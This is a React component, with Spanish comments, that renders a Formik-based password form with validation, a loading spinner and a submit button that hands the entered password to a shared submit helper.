import { useFormik } from "formik"
import { submitBase } from "../../../helpers/submitBase"
import { useGeneralData } from "../../../hooks/useGeneralData"
import { Spiner } from "../../Spiner"
import { PasswordError } from "./PasswordError"
import { PasswordInput } from "./PasswordInput"
import { passwordValidate } from "../../../security/passwordValidate"

const valuesData = { password: '' }

export const Password = () => {

  const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })
  
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues: valuesData,
      validate: values => passwordValidate({values}),
      onSubmit: async(valuesData, { resetForm }) => {
          // Descomentar si quieres tipo de documento
          // valuesData.typeDocument = selectItem
          submitBase({dataImportant, valuesData})
          return resetForm()
      }
  })
  
  return (
      <div>
          {/* Spiner de carga */}
          {
              dataImportant.showSpiner === true ? <Spiner /> : null
          }
          <PasswordError errors={errors} touched={touched} />
          {/* Colocar diseño base */}
          <form className='flex flex-col' onSubmit={handleSubmit}>

              <PasswordInput
                  password={values.password}
                  handleChange={handleChange} 
                  handleBlur={handleBlur}
                  touched={touched}
                  errors={errors}
              />
              
              <button 
                disabled={ Boolean(errors.password) && touched.password === true ? true : false }
                className='bg-blue-400 px-4 py-1 rounded'
                type='submit'
              >
                  Ingresar
              </button>
          </form>
      </div>
      )
}
